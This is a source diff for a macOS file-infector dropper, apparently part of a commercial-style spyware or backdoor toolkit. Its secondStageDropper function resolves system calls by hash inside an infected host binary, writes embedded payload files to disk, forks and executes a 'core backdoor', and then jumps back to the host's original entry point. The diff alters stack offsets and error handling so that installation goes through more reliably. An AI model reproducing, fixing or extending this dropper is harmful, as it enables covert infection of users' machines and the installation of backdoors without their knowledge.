@@ -127,7 +127,7 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
         break;
 
       offset += sizeof (struct fat_arch);
-    }	
+    }
 
   x86Offset = SWAP_LONG (f_arch->offset);
 #ifdef LOADER_DEBUG
@@ -476,7 +476,7 @@ void secondStageDropper ()
 #else
   __asm__ __volatile__ (
                         "movl 4(%%ebp), %%eax\n"
-                        "subl $0x76, %%eax\n"
+                        "subl $0xD2, %%eax\n"
                         "movl %%eax, %0\n"
                         : "=m"(baseAddress)
                         :
@@ -500,9 +500,9 @@ void secondStageDropper ()
     mov [_esp], esp
   }
 
+  //__asm__ __volatile__ { int 0x3 }
   _esp += 0x1c4 + 0x28; // restoring esp
-  _esp -= 0x40;         // Magic Number for 2010 windows only
-
+  _esp -= 0x80;         // Magic Number (depends on stack allocated vars)
 #else
   unsigned int	eax;
   unsigned int	ecx;
@@ -540,6 +540,7 @@ void secondStageDropper ()
   char *filePointer               = NULL;
   char *backdoorPath              = NULL;
   int backdoorIsAlreadyInstalled  = 0;
+  int errorOnInstall              = 0;
 
   unsigned int offset         = (unsigned int)(baseAddress) + sizeof (infectionHeader);
   infectionHeader *infection  = (infectionHeader *)baseAddress;
@@ -594,7 +595,7 @@ void secondStageDropper ()
   int   (*iclose)    (int);
   int   (*ichdir)    (const char *);
   int   (*ipwrite)   (int, const void *, int, _mOff_t);
-  int  *(*istat)     (const char *, struct stat *);
+  int   (*istat)     (const char *, struct stat *);
   void *(*immap)     (void *, _mSize_t, int, int, int, _mOff_t);
   int   (*imunmap)   (void *, _mSize_t);
   void *(*imemcpy)   (void *, const void *, int);
@@ -654,7 +655,7 @@ void secondStageDropper ()
                       iclose    = (int  (__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, closeHash) + (unsigned int)m_header);
                       ichdir    = (int  (__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libSystemAddress, chdirHash) + (unsigned int)m_header);
                       ipwrite   = (int  (__cdecl *)(int, const void *, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, pwriteHash) + (unsigned int)m_header);
-                      istat     = (int* (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libSystemAddress, statHash) + (unsigned int)m_header);
+                      istat     = (int  (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libSystemAddress, statHash) + (unsigned int)m_header);
                       immap     = (void*(__cdecl *)(void *, _mSize_t, int, int, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, mmapHash) + (unsigned int)m_header);
                       imunmap   = (int  (__cdecl *)(void *, _mSize_t))(findSymbolInFatBinary ((byte *)libSystemAddress, munmapHash) + (unsigned int)m_header);
                       imemcpy   = (void*(__cdecl *)(void *, const void *, int))(findSymbolInFatBinary ((byte *)libSystemAddress, memcpyHash) + (unsigned int)m_header);
@@ -697,7 +698,8 @@ void secondStageDropper ()
             }
           else
             {
-              doExit ();
+              errorOnInstall = 1;
+              //doExit();
             }
 
           char *backdoorDropPath = (char *)imalloc(128);
@@ -723,70 +725,78 @@ void secondStageDropper ()
                   backdoorDir = (char *)imalloc (256);
                   isprintf (backdoorDir, strings[2], backdoorDropPath, resource->path);
                 }
-
+              
               imkdir (destinationDir, 0755);
               isprintf (destinationPath, strings[2], destinationDir, resource->name);
               
               if (resource->type == RESOURCE_CORE)
                 {
                   istrncpy (backdoorPath, destinationPath, 256);
-                }
-              
-              if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_EXCL, 0755)) >= 0)
-                {
-                  int resSize = resource->size;
-
-                  if ((int)(filePointer = (char *)immap (0, resSize, PROT_READ | PROT_WRITE,
-                                                         MAP_SHARED, fd, 0)) != -1)
-                    {
-                      if (ipwrite (fd, strings[6], 1, resource->size - 1) == -1)
-                        {
-                          iclose (fd);
-                          doExit ();
-                        }
-                      
-                      offset += sizeof (resourceHeader);
-
-                      imemcpy (filePointer,
-                               (byte *)offset,
-                               resource->size);
-
-                      imunmap (filePointer, resource->size);
-                    }
                   
-                  iclose (fd);
-                }
-              else
-                {
-                  if (resource->type == RESOURCE_CORE)
+                  if ((fd = iopen (destinationPath, O_CREAT | O_EXCL, 0755)) == -1)
                     {
                       backdoorIsAlreadyInstalled = 1;
                     }
                 }
-              
+
+              int resSize = resource->size;
+              offset += sizeof (resourceHeader);
+
+              if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_TRUNC, 0755)) >= 0)
+                {
+                  //__asm__ __volatile__ { int 0x3 }
+
+                  if ((int)(filePointer = (char *)immap (0, resSize, PROT_READ | PROT_WRITE,
+                                                         MAP_SHARED, fd, 0)) != -1)
+                    {
+                      //__asm__ __volatile__ { int 0x3 }
+                      if (ipwrite (fd, strings[6], 1, resource->size - 1) == -1)
+                        {
+                          iclose (fd);
+                          errorOnInstall = 1;
+                          //doExit ();
+                        }
+                      
+                      //__asm__ __volatile__ { int 0x3 }
+                      imemcpy (filePointer,
+                               (byte *)offset,
+                               resource->size);
+                      
+                      //__asm__ __volatile__ { int 0x3 }
+
+                      imunmap (filePointer, resource->size);
+                    }
+                  
+                  //__asm__ __volatile__ { int 0x3 }
+                  iclose (fd);
+                }
+
               offset += resource->size;
               
               ifree (destinationDir);
               ifree (destinationPath);
             }
-          
+
           ifree (backdoorDropPath);
+          
+          //__asm__ __volatile__ { int 0x3 }
 
           //
           // Execute the core backdoor file
           //
-          if (backdoorIsAlreadyInstalled == 0)
+          if (//backdoorIsAlreadyInstalled == 0
+              errorOnInstall == 0)
             {
               if ((pid = ifork()) == 0)
                 {
                   ichdir (backdoorDir);
                   iexecl (backdoorPath, backdoorPath, NULL, NULL, NULL);
-                  ifree (backdoorDir);
                 }
               else if (pid > 0)
                 {
                   // jump to the original entry point
                   //doExit ();
+                  //__asm__ __volatile__ { int 0x3 }
                 }
               else if (pid < 0)
                 {
@@ -794,8 +804,10 @@ void secondStageDropper ()
                 }
             }
           
+          //__asm__ __volatile__ { int 0x3 }
+          ifree (backdoorDir);
           ifree (backdoorPath);
-          
+
           //
           // Restore register state and jump to the original entrypoint
           //
@@ -809,6 +821,7 @@ void secondStageDropper ()
 
           __asm__ __volatile__ {
             mov esp, [_esp]
+            add esp, 0x7C // Trick for esp changes
             jmp eax
           }
 #else
